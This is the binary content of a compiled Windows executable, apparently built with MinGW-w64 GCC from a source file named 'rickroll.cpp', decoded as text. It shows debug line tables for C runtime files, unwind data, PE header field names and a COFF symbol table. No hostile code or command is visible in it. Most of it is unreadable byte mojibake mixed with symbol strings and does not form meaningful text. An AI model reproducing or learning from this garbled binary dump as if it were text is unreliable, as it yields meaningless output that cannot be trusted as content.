      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt C:/crossdev/gccmaster/host-toolchain-tdm64/x86_64-w64-mingw32/include/psdk_inc C:/crossdev/gccmaster/host-toolchain-tdm64/x86_64-w64-mingw32/include C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/include  crtexe.c   intrin-impl.h   crtdefs.h   winnt.h   minwindef.h   basetsd.h   stdlib.h   errhandlingapi.h   processthreadsapi.h   combaseapi.h   wtypes.h   internal.h   math.h   tchar.h   ctype.h   string.h   process.h     	 @     õ 	òæJ{y.gÉÉË–~Ösgg¡æPZ	ºltêÖu¾`Ê”~ÁÞt ¤~#KyE‡ô;täst
ºsJ
f•ï|òÿJ‹z.xt1•õ‚ƒz‚
Xut
.°¤ ²…å¼YhZ¼ZÛË ®
ÖuJ
ÈKI…w’ òiÝ t?9>u"ÉÉI=¶–‘št_×eg0dh…Ÿ¯ kò@äo]®
ž®2+iêõyòòÕgœž¬‚Ü~žMÉYZ2	.MÉYZ2 Ù    »   û
      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt C:/crossdev/gccmaster/host-toolchain-tdm64/x86_64-w64-mingw32/include  mingw_helpers.c   combaseapi.h   wtypes.h     	°@     >Ì> m    S   û
      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt  dllargv.c     	Ð@      Q     û
      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt C:/crossdev/gccmaster/host-toolchain-tdm64/x86_64-w64-mingw32/include C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/include  merr.c   combaseapi.h   wtypes.h   internal.h   math.h   stdio.h     	à@     LÀŒOTYggg=Av•[¡äCeºöu
u‹u‹u
u )     û
      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt C:/crossdev/gccmaster/host-toolchain-tdm64/x86_64-w64-mingw32/include  pseudo-reloc.c   vadefs.h   crtdefs.h   minwindef.h   basetsd.h   winnt.h   combaseapi.h   wtypes.h   stdio.h   <built-in>    stdlib.h     	@@     Ó ?fAX? Zåˆé JµºË tµZƒ9Îƒ;=kgƒ d>VLmuW=Z$Ê t	wº–XteuÖwºŽÈžnJ YÚ~f¦Ö=Ú~ºnfgƒ
MfºL!<bžA	.wJ7<x<D È»N ß~ä¾{u.0ô‰ù $A=¨M=zž.ž[hò=gžh=yžsƒsX[º=µ~žruIº
 ù   
  û
      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt C:/crossdev/gccmaster/host-toolchain-tdm64/x86_64-w64-mingw32/include  crt_handler.c   winnt.h   crtdefs.h   minwindef.h   basetsd.h   errhandlingapi.h   combaseapi.h   wtypes.h   signal.h     	 @     á O7»¥“u?.±È4Ö»I=5@<À X1u.±Ö»¥“u\ºÒÓ XhXæ‘.eÖ»I=hçY‚<XNXåktåC¢„ ž[sŸžYhä»|zt+gDx<¤>OFŸ>Æz< fÈ/ì ä^³0»¥[Ã º®‚Ï  »>V°ž2f»hæ™»m[¾f÷X»m“TÈ< n    T   û
      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt  CRT_fp10.c     	€ @     	    Î   û
      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt C:/crossdev/gccmaster/host-toolchain-tdm64/x86_64-w64-mingw32/include  gccmain.c   combaseapi.h   wtypes.h   crtdefs.h   stdlib.h     	 @     Mæ/©Mq]ög¡91 3 ’ V]uexÈ .ô¡ 0   Ï   û
      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt C:/crossdev/gccmaster/host-toolchain-tdm64/x86_64-w64-mingw32/include  gs_support.c   winnt.h   minwindef.h   basetsd.h   stdlib.h     	P!@     2£ý“Z ždÈ®^ƒƒhV0©.u.2m?®uuXžCÉuó;=h6
tw.yŸyž|­­gÉ=jX­ 	   Ì   û
      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt C:/crossdev/gccmaster/host-toolchain-tdm64/x86_64-w64-mingw32/include  tlssup.c   crtdefs.h   minwindef.h   basetsd.h   winnt.h     	0#@     ŽP,Z¥¬k»hZXxÖu½ƒ*—sºÖ Z    T   û
      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt  cinitexe.c       û   û
      C:/crossdev/gccmaster/host-toolchain-tdm64/x86_64-w64-mingw32/include C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/include  combaseapi.h   wtypes.h   natstart.c   internal.h    Z    T   û
      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt  wildcard.c    Z    T   û
      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt  _newmode.c    Z    T   û
      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt  xtxtmode.c    A      û
      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt C:/crossdev/gccmaster/host-toolchain-tdm64/x86_64-w64-mingw32/include C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/include  atonexit.c   combaseapi.h   wtypes.h   stdlib.h   internal.h     	à#@     !XA¼HZ0Ÿ»sYZÆZZV>YWuYWuY=uf
ºèKó    ú   û
      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt C:/crossdev/gccmaster/host-toolchain-tdm64/x86_64-w64-mingw32/include C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/include  charmax.c   combaseapi.h   wtypes.h   internal.h     	°$@     u î   Ø   û
      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt C:/crossdev/gccmaster/host-toolchain-tdm64/x86_64-w64-mingw32/include  pesect.c   crtdefs.h   minwindef.h   basetsd.h   winnt.h   string.h     	À$@     	v-ˆ+¯q.	tˆv‘Iö»H`/ÎtCT¬-tS.=tp¬.sXMv‘I"H\K?Ï¼fÎ ÖaM=;>e%®XØ t¨.Ý tz.MLY³œtì tx.œ<ü to.MwI†hZzJHT.øþ~f†tú~.ˆtg&ò~f•të~.›tyJL=;=YZƒzt
äÞ~‚«tw.Þ~.ÇtcÈMLuMÉ\
.=zJ twKld. c    ]   û
      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt  pseudo-reloc-list.c    t   é   û
      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt C:/crossdev/gccmaster/host-toolchain-tdm64/x86_64-w64-mingw32/include  tlsthrd.c   crtdefs.h   minwindef.h   basetsd.h   winnt.h   minwinbase.h   stdlib.h     	`(@     á ˆÊ u0‘’xJ
X×µfwžr<å;=1/LÊwrsMg/t‚‚\ži.ËvZ
.sJXÊuä„_uäG?*žKiº-žSž ž¯sŸw‚žoXžnX' Y    S   û
      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt  tlsmcrt.c    w    O   û
      ../../../../../src/gcc-4.9.2/libgcc/config/i386  cygwin.S     	*@     ˆ""gY0uKgg0=L"" š    ”   û
      ../../../../../src/gcc-4.9.2/libgcc/../gcc/config/i386 ../../../../../src/gcc-4.9.2/libgcc  i386.h   libgcc2.c   gbl-ctors.h    `    Z   û
      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/misc  mingw_matherr.c    ^   5  û
      C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/misc C:/crossdev/gccmaster/host-toolchain-tdm64/x86_64-w64-mingw32/include/psdk_inc C:/crossdev/gccmaster/host-toolchain-tdm64/x86_64-w64-mingw32/include  invalid_parameter_handler.c   intrin-impl.h   crtdefs.h   combaseapi.h   wtypes.h     	ð*@     vòõ xž                                                                               ÿÿÿÿ x                 @            ,       @     A      D0­
A
p
A
              `@     N       D@I \       °@           BBŒA †A(…A0„A8ƒ GÐY
8AÃ0AÄ(AÅ AÆBÌBÍA
             Ð@     "       D0]          @     "       D0]     ÿÿÿÿ x               °@                  À@               ÿÿÿÿ x            h  Ð@               ÿÿÿÿ x            ˜  à@     A       D`|     ˜  0@            <   ˜  @@     ü       A„AƒDP—
˜™ƒ
ÙØ×AÃAÄE
    ÿÿÿÿ x         $   (  @@     a       A„AƒDP   \   (  °@     b      BBŒA †A(…A0„A8ƒ D
8AÃ0AÄ(AÅ AÆBÌBÍE
      T   (   @     ù      A†BŽB B(ŒA0…A8„ A@ƒC
R
ÃAÄAÅBÌBÍBÎAÆ 8H
         ÿÿÿÿ x         <       @     ¦      D0c
I
K
E
W
A
^
J
y
A
    L      Ð@     ì       BŒA†A …A(„A0ƒDP{
0AÃ(AÄ AÅAÆBÌE
  4      À@     ¸      AƒD0w
AÃC
e
AÃJ
      ÿÿÿÿ x               € @               ÿÿÿÿ x            0   @     5       D0p  4   0  Ð @     U       A„AƒD@o
AÃAÄI
        0  0!@               ÿÿÿÿ x         l   ¸  P!@     Ö       BŒA†A …A(„A0ƒDpm
0AÃ(AÄ AÅAÆBÌC
u
0AÃ(AÄ AÅAÆBÌE
       ,   ¸  0"@     û       A†A„A ƒC
         ÿÿÿÿ x         $   p  0#@     /       D0R
J
N    D   p  `#@     i       A„AƒD@e
AÃAÄC
o
AÃAÄA
          p  Ð#@               ÿÿÿÿ x         4     à#@     §       AƒD@Ž
AÃA
PAÃ           $@            D0T     ÿÿÿÿ x            €  °$@     
          ÿÿÿÿ x            °  À$@               °  à$@               °   %@     E       \   °  P%@     ž       A…A„A ƒD@e
 AÃAÄAÅA
I
 AÃAÄAÅD
Z AÃAÄAÅ  <   °  ð%@     C       A„AƒD@T
AÃAÄD
\AÃAÄ  4   °  @&@     ;       AƒD0T
AÃF
YAÃ       \   °  €&@     Ž       A…A„A ƒD@Z
 AÃAÄAÅA
Q
 AÃAÄAÅG
J AÃAÄAÅ  <   °  '@     8       A„AƒD@W
AÃAÄA
UAÃAÄ  D   °  P'@     U       A„AƒD@T
AÃAÄD
n
AÃAÄA
       l   °  °'@     ®       A†A…A „A(ƒDPY
(AÃ AÄAÅAÆK
f
(AÃ AÄAÅAÆF
I(AÃ AÄAÅAÆ    ÿÿÿÿ x         D   @	  `(@     m       A†A…A „A(ƒDP^(AÃ AÄAÅAÆ     L   @	  Ð(@            A…A„A ƒD@N
 AÃAÄAÅH
T
 AÃAÄAÅA
 4   @	  P)@     Ÿ       AƒD0P
AÃJ
J
AÃE
   $   @	  ð)@     —       D0_
A
K
A
   ÿÿÿÿ x         ,   P
  *@     2       A‚A€nÀAÂ         ÿÿÿÿ x            ˜
  ð*@               ˜
   +@     
                                                                                                                                                                                                                                                                                                       Subsystem CheckSum SizeOfImage BaseOfCode SectionAlignment MinorSubsystemVersion DataDirectory SizeOfStackCommit ImageBase SizeOfCode MajorLinkerVersion SizeOfHeapReserve SizeOfInitializedData SizeOfStackReserve SizeOfHeapCommit MinorLinkerVersion __enative_startup_state SizeOfUninitializedData AddressOfEntryPoint MajorSubsystemVersion SizeOfHeaders MajorOperatingSystemVersion FileAlignment NumberOfRvaAndSizes ExceptionRecord DllCharacteristics MinorImageVersion MinorOperatingSystemVersion LoaderFlags Win32VersionValue MajorImageVersion sSecInfo ContextRecord old_handler ExceptionRecord reset_fpu ExceptionRecord HighPart hDllHandle lpreserved dwReason __enative_startup_state pSection TimeDateStamp pNTHeader Characteristics pImageBase VirtualAddress iSection                                                                                                                                                                                                                                                                 ×              P3      Q       P                ã              pŸ3      Q       pŸ                ù              pŸ                ¿      Å       0ŸÅ      *       P+      ¾       0Ÿ                ¿      Î       0ŸÎ      ×       RÞ      ø       Rø      ú       x 1'Ÿ+      ¾       0Ÿ                å             0Ÿ                ù      )       T+      7       T                ù      +       0Ÿ+      ^       U!      +       U+      <       0Ÿ<      Š       Už      ¾       U                å      Š       0Ÿž      Î       0Ÿ                î             P                      Š       0Ÿž      Î       0Ÿ                      )       T+      7       T                =      !      
  p@     Ÿ¾      Î      
  p@     Ÿ                =             \¾      Î       \                ^             U¾      Î       U                ^      f       0Ÿf      ˜       S¾      Æ       0Ÿ                W      f       Pf             V¾      Æ       PÆ      Î       V                }      ¦       T                €      Š       0Ÿ                Ô      ë       ÿŸë      ò       P                             ÿŸ      "       P                        "        R"       ;        r ;       A        óRŸ                        ;        Q;       A        óQŸ                        ;        c;       A         óõ›Ÿ                        ;        d;       A         óõ›Ÿ                P       [        R[       \        óRŸ                `       ¸        R¸       ü        óRŸü       \       R                        ú        S            
 p@@     Ÿ      ,      
 à@@     Ÿ,      <      
 ¸@@     Ÿ<      L      
 @@     ŸL      \      
 A@     Ÿ                        &        R&       a        S                p       Î        RÎ       ~       S~      ‰       R‰      Š       óRŸŠ      ‘       R‘      Ò       S                p       ¢        Q¢              T      ‰       Q‰      Š       óQŸŠ      ‘       Q‘      Ò       T                p       Ò        XÒ       €       U€      ‰       X‰      Š       óXŸŠ      Ò       U                †       Î        RÎ       ~       S~      ‰       R‰      Š       óRŸŠ      ‘       R‘      Ò       S                Ù              P      p       \‘      Â       \Â      Ñ       PÑ      Ò       \                †       ¢        0Ÿ¢       Ë        YŠ      ‘       0Ÿ                      %       P                é      ï       Pï             X             p       &      
 s ”ÿÿÿÿ| "ý      %       X%      ,      
 s ”ÿÿÿÿ| "6      Z       XZ      a      
 s ”ÿÿÿÿ| "k      ~       X             X      ¤      
 s ”ÿÿÿÿ| "                c      Ú       Pé      *       R·      Ô       PÔ      æ       s”ÿÿÿÿ| "Ÿæ      é       s|”ÿÿÿÿ| "Ÿé      ò       Rý      0       R6      e       Rk      r       Rr      ~       s”ÿÿÿÿ| "Ÿ      ¨       RÌ      Ø       P                •      ¼       S¼      Ú       stŸÌ      Ù       S                ¼      4       Sý      ®       S                a      k       2Ÿ                a      k       ]                a      e       R                &      +       8Ÿ                &      +       ]                &      *       R                ·      æ       Sæ      ó       sxŸó      ý       S                î      ý       4Ÿ                î      ý       U                î      ò       R                ,      6       1Ÿ                ,      6       ]                ,      0       R                ¤      ®       4Ÿ                ¤      ®       ]                ¤      ¨       R                :      Z       0ŸZ      ·       T®      Ì       T                        B        RB       h        óRŸh       –        R–       ¼        óRŸ¼       Õ        RÕ       û        óRŸû              R      7       óRŸ7      G       RG      ¦       óRŸ                        =        Q=       h        óQŸh       ‘        Q‘       ¼        óQŸ¼       Ð        QÐ       û        óQŸû              Q      7       óQŸ7      B       QB      ¦       óQŸ                        F        XF       h        óXŸh       š        Xš       ¼        óXŸ¼       Ù        XÙ       û        óXŸû              X      7       óXŸ7      K       XK      ¦       óXŸ                        F        YF       h        óYŸh       š        Yš       ¼        óYŸ¼       Ù        YÙ       û        óYŸû              Y      7       óYŸ7      K       YK      ¦       óYŸ                       a        1Ÿa       c        0Ÿh       µ        1Ÿµ       ¼        0Ÿ¼       ô        1Ÿô       û        0Ÿû       j       1Ÿj      o       Po      ‰       1Ÿ‰             0Ÿ      Ÿ       1ŸŸ      ¦       0Ÿ                G       `        P¢       ¬        P¬       ´        QÚ       ó        P      &       PS      g       Po      u       Pz      ˆ       P      ž       P                       c        0Ÿh               0Ÿ       ¤        1Ÿ¼              0Ÿ      ,       1Ÿ7      ¦       0Ÿ                º      ì       0Ÿü      2       0Ÿ2      œ       T                2      M       Ph      x       P                Â      È       PÈ      ù       Vü      œ       V                       ø       Rø             S             óRŸ      2       R2      F       SF      H       RH      I       óRŸI      n       Rn      ’       S’      ™       R™      º       Sº      í       Rí      X       S                ý             Ps      ‡       Pž      ¯       Pò              P              P&      >       PD      R       P                ¥             0Ÿ             	ÿŸ      °       0Ÿ°      º       	ÿŸº             0Ÿ             	ÿŸ      ?       0Ÿ?      D       	ÿŸD      S       0ŸS      X       	ÿŸ                ¥             0Ÿ      2       0ŸI      g       0Ÿg      ’       1Ÿ’      ¤       0Ÿº      X       0Ÿ                U       W        PW       [        S|       „        P„       •        S                W       e        Se       h        sŸh       v        S                P       X        \X       `        v ÿÿÿÿ| 'Ÿ`       e        v ÿÿÿÿp ÿÿÿÿ'| 'Ÿe       m        v ÿÿÿÿu ÿÿÿÿ'| 'Ÿm       r        v ÿÿÿÿu ÿÿÿÿ'p ÿÿÿÿ'| 'Ÿr       x        v ÿÿÿÿu ÿÿÿÿ't ÿÿÿÿ'| 'Ÿ•       ·        T·       ¼       	 p0@     ¼       Ô        TÔ       Ö        u ÿÿÿÿÿÿ?Ÿ                à       ô        Rô       Û       T                      !       P!      R       YÀ      Ä       PÄ      Û       Y                        $        R$       /        óRŸ                        $        Q$       /        óQŸ                        $        X$       /        óXŸ                0       R        RR       ^        óRŸ^       s        Rs       ’        óRŸ’       –        R–       ™        óRŸ                0       R        QR       ^        óQŸ^       s        Qs       ’        óQŸ’       –        Q–       ™        óQŸ                0       R        XR       ^        óXŸ^       s        Xs       ’        óXŸ’       –        X–       ™        óXŸ                ^       s        Rs       ’        óRŸ                ^       ’        2Ÿ                ^       s        Xs       ’        óXŸ                s               S               sxŸ                ^       g       
 X@     Ÿg               S                                R       e        Se       •        óRŸ•       ¦        S¦       §        óRŸ                e       i        Pi       ”        S”       •        P                °       ¸        R¸       É        óRŸ                                 R                óRŸ                        1        R1       2        óRŸ                        1        R1       2        óRŸ                @       G        RG       …        óRŸ                G       T        RT       …        óR#<” $ &óR"Ÿ                P       ƒ        P                G       d        0Ÿ                       ž        Rž       ¾        T¾       À        óRŸÀ       Ë        TË       Í        óRŸÍ       ,       T,      .       óRŸ                ã       ð        Q                ì       +       S+      .       P                ã              0Ÿ                0      D       RD      M       óRŸM      V       RV      b       Tb      s       óRŸ                À      Ú       RÚ      â       Sâ      å       óRŸå      è       Rè      7       S:      K       S                ø      8       T:      L       T                ø             0Ÿ                      ¦       R¦      ­       óRŸ­      ¶       R¶      Â       TÂ      å       óRŸ                Í      Õ       Pá      ã       P                ð      
       R
             T             óRŸ      #       R#      ˆ       T‹      ›       T                M      P       u s "ŸP      W       SW      ž       Q                H      W       P                7      C       QC      G       u p "#G      P       S                       g        S                7       8        P8       T        T                p               R       ‰        óRŸ‰       Ÿ        RŸ       ç        Uç       è        óRŸè       ï        U                p               Q       ‰        óQŸ‰       š        Qš       æ        Tæ       è        óQŸè       ï        T                ª       ¾        P¾       å        Sè       í        Pí       ï        S                ð              R      [       S[      \       óRŸ\             S                      3       0Ÿ3      G       Q\      k       Q             0Ÿ                &      3       Q3      >       P>      B       QB      G       P\      g       Pg      o       R             Q                      ª       Rª      ´       óRŸ´      ¾       R¾      â       óRŸâ      ì       Rì              óRŸ               R              óRŸ             R             óRŸ      $       R$      '       óRŸ                      ª       Qª      ´       óQŸ´      ¾       Q¾      â       óQŸâ      ì       Qì              óQŸ              Q             óQŸ             Q             óQŸ      $       Q$      '       óQŸ                      ª       Xª      ´       óXŸ´      ¾       X¾      â       óXŸâ      ì       Xì              óXŸ              X             óXŸ             X             óXŸ      $       X$      '       óXŸ                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   X       Ð              3      Q                      å            !                   Î                      ù      û                                  =      ¶      ¾      Æ                      |       ƒ       Œ       p      Š      Ò                      6      D      ]      :      À      ®      Ì      Ù                      Ì      Ð      9      <      T      ]      a      k                                        "      &      +                      Ô      â      æ      ó                      Ù      â      î      ó                                        (      ,      6                            „      —             ¤      ®                      :      À      ®      Ì                      ¥       ¬       ®       µ       Ð       Ø                       6      D      S      [                      …      Œ      Ž      •             ¨                      Ç      Î      Ó      Ú      å      í                      V      ]      _      f      p      x                      –            Ÿ      ¦      ³      »                      ø      ÿ            
             (                             ª                                   ´      ¾             '                                                                                                                                                                                                                                                      .file   g   þÿ  gcrtexe.c              j                                Š              •   `                        ¼   p                        â   €                          P                        )                          G  @                        e             p                           ‹                          ¨                           ¾  @                        Ú  À                          `            0                    envp           argv            argc    (           +              5  ð                    argret             P  °          b  p                        ‡  €                        ­             ·                           Þ  `                          0                        #                       mainret            B  À                        X  °                        n  à                        „  Ð                        š  Ð          ¬  Ô      .l_endw ì          ¶         .l_start      .l_end            Å                          ë                       .text          "  N             .data                           .bss           ,                 .xdata         h   
             .pdata         H                                                
                                   
   ¡'  ™                 #         3                    1                            <      
   0                    K         à                     Y      
   1                   e                             p                            {                         .file   q   þÿ  gcrtbegin.c        .text   0                       .data                           .bss    0                            p  °                      .file   ƒ   þÿ  grickroll.cpp      main    0                       .text   0     t                .data                           .bss    0                        .rdata         ,                 .xdata  h                       .pdata  H                          p  Ð                      .file   ž   þÿ  gmingw_helpers.c       ˆ  °                           ˜  À      .text   °                      .data                           .bss    0                       .xdata  t                       .pdata  T                            ¡'  
   ä                   #  3     ‡                     <  0   
   0                    Y  1  
   Ý                    p  ð                          {        H                .file   ¸   þÿ  gdllargv.c         _setargvÐ                       .text   Ð                      .data                           .bss    @                        .xdata  |                       .pdata  l                            …,  
                      #  º     7                     <  `   
   0                    Y    
   q                    p                            {  h     0                .file   Ù   þÿ  gmerr.c                ¨  à                           ¾  @           Ì  0      _matherr@      .text   à     \               .data                           .bss    @                       .xdata  €      $                 .pdata  x      $   	             .rdata  0      @                      ".  
   ]                    #  ñ     z                    1       2                   <     
   0                    Y    
   U                   p  0                          {  ˜                     .file     þÿ  gpseudo-reloc.c        ã  @                            ò  °             T       the_secsX              	          .  P           =  à                        n  ð                    .text   @      Ù  *             .data                           .bss    P                       .rdata  p                     .xdata  ¤      8                 .pdata  œ      $   	                   5  
   Á  \                 #  k     "                    1  B      i                    <  À   
   0                    K  à      0                    Y  Ô  
   -                   e       	                     p  P                          {  (     ø                .file   )  þÿ  gcrt_handler.c         ›                              µ  Ð
          Ë  ˆ           Ú  À          ä  À           î  À      .text         X               .data                           .bss    €      À                .xdata  Ü                        .pdata  À      $   	             .rdata  €                             @G  
   N  @                 #  	     d                    1  «     ‡	                    <  ð   
   0                    Y    
   ý                   e  (     4                     p  p                          {        à                .file   D  þÿ  gCRT_fp10.c        _fpreset€                       fpreset €      .text   €                      .data                           .bss    @                       .xdata  ü                       .pdata  ä                            Ž\  
   ¾                    #  ñ
     *                     <     
   0                    Y  þ	  
   r                    p                            {        0                .file   f  þÿ  ggccmain.c                                      p.73208              Ð          )  Ð                    __main  0          F  @      .text        ¼                 .data                         .bss    @                      .xdata                         .pdata  ð      $   	                   L]  
   ¨  
                 #                           1  2     §                     <  P  
   0                    Y  p
  
                      p  °                          {  0     ˆ                .file   Ž  þÿ  ggs_support.c          R  P                           i  p                            €                          ¤  0          ·  €          È  €          Û        .text   P     Û               .data                            .bss    €     ˜                .xdata                         .pdata                       .rdata                             ôb  
   y                   #  /
     Ñ                    1  Ù     à                   <  €  
   0                    Y  ‹
  
   4                   e  \                          p  Ð                          {  ¸     ¸                .file   Æ  þÿ  gtlssup.c              ð  0                           ÿ  `             °                    __xd_a  X       __xd_z  `           %   Ð      .text   0     £                .data                            .bss    @	                      .xdata  8                      .pdata  ,     $   	             .CRT$XLDH                      .CRT$XLC@                      .rdata                        .CRT$XDZ`                       .CRT$XDAX                       .tls        	   (                .CRT$XLZP                       .CRT$XLA8                       .tls$ZZZ`   	                    .tls$AAA    	                          mq  
   Û  )                 #        ”                    1  ¹     Y                   <  °  
   0                    Y  ¿  
   
                   e  u                          p  ð                          {  p                      .file   à  þÿ  gcinitexe.c        .text   à                       .data                            .bss    P	                       .CRT$XCZ                       .CRT$XCA                        .CRT$XIZ0                       .CRT$XIA                             Hx  
   ²                   #  ”     Y                     <  à  
                        Y  Ì
  
   ^                     p                        .file   ô  þÿ  gnatstart.c        .text   à                       .data                           .bss    P	                             úy  
   /                   #  í     ‚                     <     
                        Y  *  
                       e  ”                          p  0                      .file     þÿ  gwildcard.c        .text   à                       .data   0                        .bss    P	                            )  
   ´                    #  o     *                     <     
                        Y  /  
   ^                     p  P                      .file     þÿ  g_newmode.c        .text   à                       .data   0                        .bss    `	                            Ý  
   ±                    #  ™     *                     <  @  
                        Y    
   ^                     p  p                      .file   *  þÿ  gxtxtmode.c        .text   à                       .data   0                        .bss    p	                            Ž€  
   ¯                    #  Ã     *                     <  `  
                        Y  ë  
   ^                     p                        .file   I  þÿ  gatonexit.c            1   à                           >   P                    atexit        .text   à     É                .data   0                        .bss    €	                       .xdata  P                      .pdata  P                           =  
   Ø                   #  í     {                    1       ÷                     <  €  
   0                    Y  I  
   E                   p  °                          {       p                .file   e  þÿ  gcharmax.c             [   °                       .text   °     
                .data   0                       .bss    €	                      .xdata  `                      .pdata  h                     .CRT$XIC(                            ˆ  
   ê                   #  h     š                     <  °  
   0                    Y  Ž  
                      p  Ð                          {  €     0                .file   Ž  þÿ  gpesect.c              i   À                           ƒ   à          –              ¥   P          º   ð          ×   @          ï   €                        P          /  °      .text   À     ž  	             .data   @                        .bss    	                       .xdata  d     `                 .pdata  t     x                      ÿŒ  
   r  b                 #       R                    1  	      Ò                    <  à  
   0                    K       °                    Y  ¨  
   ò                   e  ¬     T                     p  ð                          {  °                    .file      þÿ  g    Q            .text   `                       .data   @                        .bss    	                            qŸ  
                      #  T     *                     <    
                        Y  š  
   g                     p                         .file   Ä  þÿ  gtlsthrd.c             e  `                           …  À	          “   	          ¡  Ð          ¾  ¨	          Ñ  P          ñ  ð      .text   `     '  #             .data   @                        .bss     	     H                 .xdata  Ä     ,                 .pdata  ì     0                      t   
   Ž  3                 #  ~     µ                    1  Û%     )                    <  0  
   0                    K  À     `                     Y    
   x                   p  0                           {  @	                    .file   Ö  þÿ  gtlsmcrt.c         .text                          .data   @                       .bss     
                             ©  
   ¯                    #  3     *                     <  `  
                        Y  y  
   ]                     p  P                       .file   è  þÿ  gfake                    ±©  
   ª                    #  ]                          Y  Ö  
   {                .text        2                 .data   P                        .bss     
                           <  €  
   0                    {  P
     H                .file   ú  þÿ  glibgcc2.c         .text   Ð                       .data   P                        .bss     
                             [ª  
   ô                   #  q     s                     <  °  
                        Y  Q  
   ž                     p  p                       .file   !  þÿ  gmingw_matherr.c   .text   Ð                       .data   P                       .bss     
                             O·  
   Ë                    #  ä     *                     <  Ð  
                        Y  ï  
   d                     p                         .text   Ð      .data   `       .bss     
      .idata$7Ü        .idata$5ü       .idata$4,       .idata$6ú       .text   Ø      .data   `       .bss     
      .idata$7ô        .idata$5,       .idata$4\       .idata$6Z       .text   à      .data   `       .bss     
      .idata$7ä        .idata$5       .idata$4<       .idata$6        .file   î  þÿ  g    ‹	                	  ð                       handler  
          )	  ð          H	             l	         .text   ð                     .data   `                      .bss     
                      .xdata  ð                      .pdata                             ¸  
   `  
                 #       .                    <  ð  
   0                    Y  S  
   b                   p  °                           {  ˜
     H                .text         .data   p       .bss    
      .idata$74       .idata$5¬       .idata$4Ü       .idata$6
        .text         .data   p       .bss    
      .idata$7@       .idata$5Ä       .idata$4ô       .idata$6(        .text          .data   p       .bss    
      .idata$78       .idata$5´       .idata$4ä       .idata$6        .text   (      .data   p       .bss    
      .idata$7       .idata$5L       .idata$4|       .idata$6˜       .text   0      .data   p       .bss    
      .idata$7        .idata$5D       .idata$4t       .idata$6Š       .text   8      .data   p       .bss    
      .idata$7       .idata$5\       .idata$4Œ       .idata$6¬       .text   @      .data   p       .bss    
      .idata$7$       .idata$5Œ       .idata$4¼       .idata$6æ       .text   H      .data   p       .bss    
      .idata$7è        .idata$5       .idata$4D       .idata$60       .text   H      .data   p       .bss    
      .idata$7ü        .idata$5<       .idata$4l       .idata$6€       .text   H      .data   p       .bss    
      .idata$7       .idata$5T       .idata$4„       .idata$6¢       .text   H      .data   p       .bss    
      .idata$7ø        .idata$54       .idata$4d       .idata$6l       .text   P      .data   p       .bss    
      .idata$7ì        .idata$5       .idata$4L       .idata$6<       .text   X      .data   p       .bss    
      .idata$7(       .idata$5”       .idata$4Ä       .idata$6î       .text   `      .data   p       .bss    
      .idata$70       .idata$5¤       .idata$4Ô       .idata$6         .text   h      .data   p       .bss    
      .idata$7H       .idata$5Ô       .idata$4       .idata$6<        .text   p      .data   p       .bss    
      .idata$7       .idata$5|       .idata$4¬       .idata$6Ô       .text   x      .data   p       .bss    
      .idata$7<       .idata$5¼       .idata$4ì       .idata$6        .text   €      .data   p       .bss    
      .idata$7       .idata$5d       .idata$4”       .idata$6¸       .text   ˆ      .data   p       .bss    
      .idata$7à        .idata$5       .idata$44       .idata$6       .text         .data   p       .bss    
      .idata$7       .idata$5t       .idata$4¤       .idata$6Ê       .text   ˜      .data   p       .bss    
      .idata$7       .idata$5l       .idata$4œ       .idata$6À       .text          .data   p       .bss    
      .idata$7ð        .idata$5$       .idata$4T       .idata$6J       .text   ¨      .data   p       .bss    
      .idata$7D       .idata$5Ì       .idata$4ü       .idata$62        .text   °      .data   p       .bss    
      .idata$7        .idata$5„       .idata$4´       .idata$6Ü       .text   ¸      .data   p       .bss    
      .idata$7,       .idata$5œ       .idata$4Ì       .idata$6ø       .file   ü  þÿ  gfake              hname   ,       fthunk  ü       .text   À                       .data   p                        .bss    
                       .idata$2                       .idata$4,       .idata$5ü       .file     þÿ  gfake              .text   À                       .data   p                        .bss    
                       .idata$4                       .idata$5Ü                       .idata$7L      
                 .text   À      .data   p       .bss    
      .idata$7X       .idata$5ä       .idata$4       .idata$6H        .file     þÿ  gfake              hname          fthunk  ä       .text   Ð                       .data   p                        .bss    
                       .idata$2(                       .idata$4       .idata$5ä       .file   4  þÿ  gfake              .text   Ð                       .data   p                        .bss    
                       .idata$4                       .idata$5ì                       .idata$7\                       .text   Ð      .data   p       .bss    
      .idata$7h       .idata$5ô       .idata$4$       .idata$6X        .file   B  þÿ  gfake              hname   $       fthunk  ô       .text   à                       .data   p                        .bss    
                       .idata$2<                       .idata$4$       .idata$5ô       .file   ø  þÿ  gfake              .text   à                       .data   p                        .bss    
                       .idata$4,                       .idata$5ü                       .idata$7l      
                 .text   à      .data   p       .bss    
      .idata$7´        .idata$5Ä       .idata$4ô        .idata$6’       .text   è      .data   p       .bss    
      .idata$7°        .idata$5¼       .idata$4ì        .idata$6t       .text   ð      .data   p       .bss    
